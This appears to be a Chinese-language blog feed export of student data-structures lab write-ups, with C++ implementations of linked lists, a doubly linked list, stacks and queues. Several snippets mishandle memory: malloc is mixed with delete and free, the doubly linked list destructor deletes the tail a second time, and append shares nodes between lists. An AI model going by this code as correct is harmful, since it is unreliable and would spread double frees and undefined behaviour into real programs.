<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">LinkList::insert</span><span class="params">(<span class="keyword">const</span> <span class="keyword">int</span>&amp; data, <span class="keyword">const</span> <span class="keyword">int</span>&amp; location)</span></span>&#123;</span><br><span class="line">    node *newNode = (node*) <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(node));</span><br><span class="line">    newNode-&gt;value = data;</span><br><span class="line">    <span class="keyword">if</span> (head == <span class="literal">NULL</span> || location == <span class="number">0</span>) &#123;</span><br><span class="line">        newNode-&gt;next = head;</span><br><span class="line">        head = newNode;</span><br><span class="line">        len++;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    node *p = head;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; location - <span class="number">1</span>; i++)</span><br><span class="line">        p = p-&gt;next;</span><br><span class="line">    newNode-&gt;next = p-&gt;next;</span><br><span class="line">    p-&gt;next = newNode;</span><br><span class="line">    len++;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="0x05-remove"><a href="#0x05-remove" class="headerlink" title="0x05 remove"></a>0x05 remove</h1><p>分情况：</p>
<ul>
<li>当删除头结点时，直接<strong>释放头结点内存</strong>，头指针后移；</li>
<li>当删除结点不为头结点时，判断位置合法性后，指针移动到前一个位置，断开并重新链接，<strong>释放内存</strong>。</li>
</ul>
<p>长度减1。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">LinkList::remove</span><span class="params">(<span class="keyword">const</span> <span class="keyword">int</span>&amp; location)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (location == <span class="number">0</span>) &#123;</span><br><span class="line">        node *temp = head;</span><br><span class="line">        head = head-&gt;next;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">delete</span> temp;</span><br><span class="line">        temp = <span class="literal">NULL</span>;</span><br><span class="line">        len--;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        node *p = head;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; location - <span class="number">1</span>; i++)</span><br><span class="line">            p = p-&gt;next;</span><br><span class="line">        <span class="keyword">if</span> (p == <span class="literal">NULL</span> || p-&gt;next == <span class="literal">NULL</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        node *temp = p-&gt;next;</span><br><span class="line">        p-&gt;next = temp-&gt;next;</span><br><span class="line">        len--;</span><br><span class="line">        <span class="built_in">free</span>(temp);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="0x06-converse"><a href="#0x06-converse" class="headerlink" title="0x06 converse"></a>0x06 converse</h1><p>不改变指针域的情况下，交换数值。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">LinkList::converse</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; len / <span class="number">2</span>; i++) &#123;</span><br><span class="line">        node *p = head;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; i; j++)</span><br><span class="line">            p = p-&gt;next;</span><br><span class="line">        node *q = head;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; len - i - <span class="number">1</span>; j++)</span><br><span class="line">            q = q-&gt;next;</span><br><span class="line">        <span class="keyword">int</span> temp = p-&gt;value;</span><br><span class="line">        p-&gt;value = q-&gt;value;</span><br><span class="line">        q-&gt;value = temp;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="0x07-append"><a href="#0x07-append" class="headerlink" title="0x07 append"></a>0x07 append</h1><p>在表尾链接新表，长度增加。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">LinkList::append</span><span class="params">(<span class="keyword">const</span> LinkList&amp; append_list)</span></span>&#123;</span><br><span class="line">    node *p = head;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; len - <span class="number">1</span>; i++)</span><br><span class="line">        p = p-&gt;next;</span><br><span class="line">    p-&gt;next = append_list.head;</span><br><span class="line">    len += append_list.len;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="0x08-析构函数"><a href="#0x08-析构函数" class="headerlink" title="0x08 析构函数"></a>0x08 析构函数</h1><p><strong>逐结点</strong>释放内存。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">LinkList::~LinkList()&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; len; i++) &#123;</span><br><span class="line">        node *temp;</span><br><span class="line">        temp = head;</span><br><span class="line">        head = head-&gt;next;</span><br><span class="line">        <span class="keyword">delete</span> temp;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">delete</span> head;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      <tags>
        <tag>Experiments</tag>
        <tag>Data Structures</tag>
      </tags>
  </entry>
  <entry>
    <title>还不会实现「双向链表」？</title>
    <url>/Data-Structures-Experiment-3/</url>
    <content><![CDATA[<p>Data Structures Experiment #3 - 双向链表的实现。</p>
<a id="more"></a>

<p><img src="https://super-bucket1.oss-cn-beijing.aliyuncs.com/ExiTalk.png"></p>
<blockquote>
<ul>
<li><code>DBLinkList::DBLinkList();</code><br>构造函数，需要在类中初始化相应的成员变量。</li>
<li><code>DBLinkList::~DBLinkList();</code><br>析构函数，需要将所有动态申请的内存都释放。</li>
<li><code>void DBLinkList::insert(int data, int location);</code><br>在<code>location</code>位置插入<code>data</code>，测试程序保证<code>data</code>合法。</li>
<li><code>void DBLinkList::remove(int location);</code><br>将<code>location</code>的元素移除，测试程序保证<code>location</code>的合法性。</li>
<li><code>int DBLinkList::length();</code><br>获取双向链表的长度。</li>
<li><code>int DBLinkList::getData(int location);</code><br>获取列表中<code>lcation</code>位置的元素，测试数据保证<code>location</code>的合法。</li>
<li><code>void DBLinkList::bubbleSort();</code><br>将双向链表进行冒泡排序。</li>
</ul>
</blockquote>
<h1 id="0x01-构造函数"><a href="#0x01-构造函数" class="headerlink" title="0x01 构造函数"></a>0x01 构造函数</h1><p>将头、尾指针均赋为空。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">DBLinkList::DBLinkList()&#123;</span><br><span class="line">    head = <span class="literal">NULL</span>;</span><br><span class="line">    tail = <span class="literal">NULL</span>;</span><br><span class="line">    len = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="0x02-insert"><a href="#0x02-insert" class="headerlink" title="0x02 insert"></a>0x02 insert</h1><p>判断位置的合法性。</p>
<p>分情况：</p>
<ul>
<li>在表头插入，判断是否为空表；</li>
<li>在表中插入，指针沿链表移动到前一个位置，断开并重新链接；</li>
<li>在表尾插入，利用尾指针链接。</li>
</ul>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">DBLinkList::insert</span><span class="params">(<span class="keyword">int</span> data, <span class="keyword">int</span> location)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (location &lt; <span class="number">0</span> || location &gt; len)</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">    DBNode *newNode = <span class="keyword">new</span> DBNode;</span><br><span class="line">    newNode-&gt;value = data;</span><br><span class="line">    <span class="keyword">if</span> (location == <span class="number">0</span>) &#123;</span><br><span class="line">        newNode-&gt;nxt = head;</span><br><span class="line">        newNode-&gt;pre = <span class="literal">NULL</span>;</span><br><span class="line">        head = newNode;</span><br><span class="line">        <span class="keyword">if</span> (tail == <span class="literal">NULL</span>) &#123;</span><br><span class="line">            tail = newNode;</span><br><span class="line">            newNode-&gt;nxt = <span class="literal">NULL</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span></span><br><span class="line">            newNode-&gt;nxt-&gt;pre = newNode;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (location != len) &#123;</span><br><span class="line">    DBNode *p = head;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; location - <span class="number">1</span>; i++)</span><br><span class="line">        p = p-&gt;nxt;</span><br><span class="line">    p-&gt;nxt-&gt;pre = newNode;</span><br><span class="line">    newNode-&gt;nxt = p-&gt;nxt;</span><br><span class="line">    p-&gt;nxt = newNode;</span><br><span class="line">    newNode-&gt;pre = p;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (location == len) &#123;</span><br><span class="line">        tail-&gt;nxt = newNode;</span><br><span class="line">        newNode-&gt;pre = tail;</span><br><span class="line">        tail = newNode;</span><br><span class="line">        newNode-&gt;nxt = <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    len++;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="0x03-remove"><a href="#0x03-remove" class="headerlink" title="0x03 remove"></a>0x03 remove</h1><p>同上。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">DBLinkList::remove</span><span class="params">(<span class="keyword">int</span> location)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (location == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (len == <span class="number">1</span>) &#123;</span><br><span class="line">            DBNode *temp = head;</span><br><span class="line">            head = <span class="literal">NULL</span>;</span><br><span class="line">            tail = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">delete</span> temp;</span><br><span class="line">            temp = <span class="literal">NULL</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            head-&gt;nxt-&gt;pre = <span class="literal">NULL</span>;</span><br><span class="line">            DBNode *temp = head;</span><br><span class="line">            head = head-&gt;nxt;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">delete</span> temp;</span><br><span class="line">            temp = <span class="literal">NULL</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (location != len - <span class="number">1</span>) &#123;</span><br><span class="line">        DBNode *p = head;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; location; i++)</span><br><span class="line">            p = p-&gt;nxt;</span><br><span class="line">        p-&gt;pre-&gt;nxt = p-&gt;nxt;</span><br><span class="line">        p-&gt;nxt-&gt;pre = p-&gt;pre;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">delete</span> p;</span><br><span class="line">        p = <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (location == len - <span class="number">1</span>) &#123;</span><br><span class="line">        DBNode *temp = tail;</span><br><span class="line">        tail = tail-&gt;pre;</span><br><span class="line">        tail-&gt;nxt = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">delete</span> temp;</span><br><span class="line">        temp = <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    len--;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="0x04-length"><a href="#0x04-length" class="headerlink" title="0x04 length"></a>0x04 length</h1><p>直接返回长度。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">DBLinkList::length</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> len;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="0x05-getData"><a href="#0x05-getData" class="headerlink" title="0x05 getData"></a>0x05 getData</h1><p>指针沿链表移动到该位置，返回其数值。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">DBLinkList::getData</span><span class="params">(<span class="keyword">int</span> location)</span></span>&#123;</span><br><span class="line">    DBNode *p = head;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; location; i++)</span><br><span class="line">        p = p-&gt;nxt;</span><br><span class="line">    <span class="keyword">return</span> p-&gt;value;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="0x06-bubbleSort"><a href="#0x06-bubbleSort" class="headerlink" title="0x06 bubbleSort"></a>0x06 bubbleSort</h1><p>冒泡排序，未改变指针，仅交换数值。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">DBLinkList::bubbleSort</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; len - <span class="number">1</span>; i++) &#123;</span><br><span class="line">        DBNode *p = head;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; len - i - <span class="number">1</span>; j++)</span><br><span class="line">        &#123;</span><br><span class="line">            p = p-&gt;nxt;</span><br><span class="line">            <span class="keyword">if</span> (p-&gt;pre-&gt;value &gt; p-&gt;value) &#123;</span><br><span class="line">                <span class="keyword">int</span> temp = p-&gt;pre-&gt;value;</span><br><span class="line">                p-&gt;pre-&gt;value = p-&gt;value;</span><br><span class="line">                p-&gt;value = temp;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="0x07-析构函数"><a href="#0x07-析构函数" class="headerlink" title="0x07 析构函数"></a>0x07 析构函数</h1><p>逐结点释放内存。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">DBLinkList::~DBLinkList()&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; len; i++) &#123;</span><br><span class="line">        DBNode *temp;</span><br><span class="line">        temp = head;</span><br><span class="line">        head = head-&gt;nxt;</span><br><span class="line">        <span class="keyword">delete</span> temp;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">delete</span> head;</span><br><span class="line">    <span class="keyword">delete</span> tail;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      <tags>
        <tag>Experiments</tag>
        <tag>Data Structures</tag>
      </tags>
  </entry>
  <entry>
    <title>还不会实现「栈」？</title>
    <url>/Data-Structures-Experiment-4/</url>
    <content><![CDATA[<p>Data Structures Experiment #4 - 设计并实现栈类。</p>
<a id="more"></a>

<p><img src="https://super-bucket1.oss-cn-beijing.aliyuncs.com/ExiTalk.png"></p>
<blockquote>
<p>栈可以由顺序表或者链表的方式去实现。通常，栈的操作是固定的，但是在编程过程中有时希望可以由自己控制到底使用链栈还是顺序栈。所以通常使用<a href="https://www.cnblogs.com/alinh/p/9636352.html"><strong>多态</strong></a>（<a href="https://blog.csdn.net/qq_39412582/article/details/81628254">什么是多态？</a>）去编写链栈与顺序栈的代码。</p>
<ul>
<li><code>void push_back(int data);</code><br>将<code>data</code>入栈。</li>
<li><code>int top() const;</code><br>询问栈顶元素的值并返回。</li>
<li><code>void pop();</code><br>弹出栈顶元素。</li>
</ul>
</blockquote>
<h1 id="SeqStack"><a href="#SeqStack" class="headerlink" title="SeqStack"></a>SeqStack</h1><h2 id="0x01-构造函数"><a href="#0x01-构造函数" class="headerlink" title="0x01 构造函数"></a>0x01 构造函数</h2><p>分配<code>MAX_ELEMENTS</code> 大小的内存空间。</p>
<p>“栈顶指针”初始化为0。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">SeqStack::SeqStack()&#123;</span><br><span class="line">    SeqList = <span class="keyword">new</span> <span class="keyword">int</span>[MAX_ELEMENTS];</span><br><span class="line">    data_top = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="0x02-push-back"><a href="#0x02-push-back" class="headerlink" title="0x02 push_back"></a>0x02 push_back</h2><p>判断栈满否。</p>
<p>栈未满则压入栈，“栈顶指针”上移。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">SeqStack::push_back</span><span class="params">(<span class="keyword">int</span> data)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (data_top &gt; MAX_ELEMENTS - <span class="number">1</span>)</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        SeqList[data_top] = data;</span><br><span class="line">        data_top++;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="0x03-top"><a href="#0x03-top" class="headerlink" title="0x03 top"></a>0x03 top</h2><p>判断栈空否。</p>
<p>栈不空则返回“栈顶指针”下一位的数值。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">SeqStack::top</span><span class="params">()</span> <span class="keyword">const</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (data_top == <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="keyword">return</span> SeqList[data_top - <span class="number">1</span>];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="0x04-pop"><a href="#0x04-pop" class="headerlink" title="0x04 pop"></a>0x04 pop</h2><p>判断栈空否。</p>
<p>栈不空则“栈顶指针”下移。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">SeqStack::pop</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (data_top == <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        data_top--;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="0x05-析构函数"><a href="#0x05-析构函数" class="headerlink" title="0x05 析构函数"></a>0x05 析构函数</h2><p>释放内存。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">SeqStack::~SeqStack()&#123;</span><br><span class="line">    <span class="keyword">delete</span>[] SeqList;</span><br><span class="line">    SeqList = <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="LinkStack"><a href="#LinkStack" class="headerlink" title="LinkStack"></a>LinkStack</h1><h2 id="0x01-构造函数-1"><a href="#0x01-构造函数-1" class="headerlink" title="0x01 构造函数"></a>0x01 构造函数</h2><p>栈顶指针初始化为空。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">LinkStack::LinkStack()&#123;</span><br><span class="line">    head = <span class="literal">NULL</span>;</span><br><span class="line">    length = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="0x02-push-back-1"><a href="#0x02-push-back-1" class="headerlink" title="0x02 push_back"></a>0x02 push_back</h2><p>链入栈。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">LinkStack::push_back</span><span class="params">(<span class="keyword">int</span> data)</span></span>&#123;</span><br><span class="line">    StackNode *newNode = <span class="keyword">new</span> StackNode;</span><br><span class="line">    newNode-&gt;value = data;</span><br><span class="line">    newNode-&gt;next = head;</span><br><span class="line">    head = newNode;</span><br><span class="line">    length++;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="0x03-top-1"><a href="#0x03-top-1" class="headerlink" title="0x03 top"></a>0x03 top</h2><p>判断栈空否。</p>
<p>栈不空则返回栈顶指针处的数值。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">LinkStack::top</span><span class="params">()</span> <span class="keyword">const</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (length == <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="keyword">return</span> head-&gt;value;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="0x04-pop-1"><a href="#0x04-pop-1" class="headerlink" title="0x04 pop"></a>0x04 pop</h2><p>判断栈空否。</p>
<p>栈不空则将栈顶元素弹出栈并释放内存。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">LinkStack::pop</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (length == <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        StackNode *temp = head;</span><br><span class="line">        head = head-&gt;next;</span><br><span class="line">        <span class="keyword">delete</span> temp;</span><br><span class="line">        temp = <span class="literal">NULL</span>;</span><br><span class="line">        length--;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="0x05-析构函数-1"><a href="#0x05-析构函数-1" class="headerlink" title="0x05 析构函数"></a>0x05 析构函数</h2><p>逐结点释放内存。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">LinkStack::~LinkStack()&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; length; i++) &#123;</span><br><span class="line">        StackNode *temp;</span><br><span class="line">        temp = head;</span><br><span class="line">        head = head-&gt;next;</span><br><span class="line">        <span class="keyword">delete</span> temp;</span><br><span class="line">        temp = <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">delete</span> head;</span><br><span class="line">    head = <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      <tags>
        <tag>Experiments</tag>
        <tag>Data Structures</tag>
      </tags>
  </entry>
  <entry>
    <title>还不会实现「队列」？</title>
    <url>/Data-Structures-Experiment-5/</url>
    <content><![CDATA[<p>Data Structures Experiment #5 - 设计并实现队列类。</p>
<a id="more"></a>

<p><img src="https://super-bucket1.oss-cn-beijing.aliyuncs.com/ExiTalk.png"></p>
<blockquote>
<ul>
<li><code>MyQueue();</code><br>构造函数。</li>
<li><code>~MyQueue();</code><br>析构函数。</li>
<li><code>void push_back(int data);</code><br>将数据data插入到队列的队尾。</li>
<li><code>void pop_front();</code><br>队首元素出队。</li>
<li><code>int front();</code><br>询问队首元素的值。</li>
</ul>
</blockquote>
<h1 id="SeqQueue"><a href="#SeqQueue" class="headerlink" title="SeqQueue"></a>SeqQueue</h1><h2 id="0x00-数据域封装"><a href="#0x00-数据域封装" class="headerlink" title="0x00 数据域封装"></a>0x00 数据域封装</h2><p>“队尾指针”、“队首指针”、队列和最大元素个数。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="keyword">int</span> rear, fore;</span><br><span class="line">    <span class="keyword">int</span>* SeqList;</span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">static</span> <span class="keyword">int</span> MAX_ELEMENTS = <span class="number">100</span>;</span><br></pre></td></tr></table></figure>
<h2 id="0x01-构造函数"><a href="#0x01-构造函数" class="headerlink" title="0x01 构造函数"></a>0x01 构造函数</h2><p>分配<code>MAX_ELEMENTS</code>大小的内存空间。</p>
<p>“队尾指针”和“队首指针”均初始化为0。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">SeqQueue::SeqQueue()&#123;</span><br><span class="line">    SeqList = <span class="keyword">new</span> <span class="keyword">int</span>[MAX_ELEMENTS];</span><br><span class="line">    rear = fore = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="0x02-push-back"><a href="#0x02-push-back" class="headerlink" title="0x02 push_back"></a>0x02 push_back</h2><p>判断队列满否。</p>
<p>队列不满则在队尾入队。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">SeqQueue::push_back</span><span class="params">(<span class="keyword">int</span> data)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (rear &gt; MAX_ELEMENTS - <span class="number">1</span>)</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    SeqList[rear] = data;</span><br><span class="line">    rear++;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="0x03-pop-front"><a href="#0x03-pop-front" class="headerlink" title="0x03 pop_front"></a>0x03 pop_front</h2><p>判断队列空否。</p>
<p>队列不空则在队首出队。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">SeqQueue::pop_front</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (rear == <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    fore++;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="0x04-front"><a href="#0x04-front" class="headerlink" title="0x04 front"></a>0x04 front</h2><p>判断队列空否。</p>
<p>队列不空则返回队首元素。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">SeqQueue::front</span><span class="params">()</span> <span class="keyword">const</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (rear == <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">return</span> SeqList[fore];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="0x05-析构函数"><a href="#0x05-析构函数" class="headerlink" title="0x05 析构函数"></a>0x05 析构函数</h2><p>释放内存。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">SeqQueue::~SeqQueue()&#123;</span><br><span class="line">    <span class="keyword">delete</span>[] SeqList;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="LinkQueue"><a href="#LinkQueue" class="headerlink" title="LinkQueue"></a>LinkQueue</h1><h2 id="0x00-数据域封装-1"><a href="#0x00-数据域封装-1" class="headerlink" title="0x00 数据域封装"></a>0x00 数据域封装</h2><p>定义队列结点结构体（数据域和指针域）、队首指针和队尾指针。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">QueueNode</span>&#123;</span></span><br><span class="line">        QueueNode* next;</span><br><span class="line">        <span class="keyword">int</span> value;</span><br><span class="line">    &#125;;</span><br><span class="line">    QueueNode* fore;</span><br><span class="line">    QueueNode* rear;</span><br></pre></td></tr></table></figure>
<h2 id="0x01-构造函数-1"><a href="#0x01-构造函数-1" class="headerlink" title="0x01 构造函数"></a>0x01 构造函数</h2><p>队首指针和队尾指针均初始化为空。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">LinkQueue::LinkQueue()&#123;</span><br><span class="line">    fore = rear = <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="0x02-push-back-1"><a href="#0x02-push-back-1" class="headerlink" title="0x02 push_back"></a>0x02 push_back</h2><p>分情况：</p>
<ul>
<li>若队列为空则直接链入队；</li>
<li>若队列不为空则在队尾链入队。</li>
</ul>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">LinkQueue::push_back</span><span class="params">(<span class="keyword">int</span> data)</span></span>&#123;</span><br><span class="line">    QueueNode *newNode = <span class="keyword">new</span> QueueNode;</span><br><span class="line">    newNode-&gt;value = data;</span><br><span class="line">    newNode-&gt;next = <span class="literal">NULL</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (fore == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        fore = rear = newNode;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        rear-&gt;next = newNode;</span><br><span class="line">        rear = newNode;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="0x03-pop-front-1"><a href="#0x03-pop-front-1" class="headerlink" title="0x03 pop_front"></a>0x03 pop_front</h2><p>判断队列空否。</p>
<p>队列不空则队首指针后移并释放内存。</p>
